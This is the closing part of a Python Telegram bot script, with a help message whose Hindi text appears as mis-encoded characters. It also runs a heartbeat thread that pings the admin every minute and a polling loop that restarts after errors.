ЁЯТе рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓реЙрдЧред
ЁЯТе рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░реЗрдВред
ЁЯТе рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╛рдл рдХрд░реЗрдВред
'''
    bot.reply_to(message, response)
#----------------------------------------------------------------

def send_start_command():
    while True:
        try:
            bot.send_message(admin_id[0], 'server running...')
        except Exception as e:
            print(f"Error sending server running... command: {e}")
        time.sleep(60)

# Start the thread to run send_start_command
start_thread = threading.Thread(target=send_start_command)
start_thread.daemon = True  # Ensure it exits when the main program exits
start_thread.start()



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


# bot.polling(none_stop=True, timeout=300, long_polling_timeout=60)
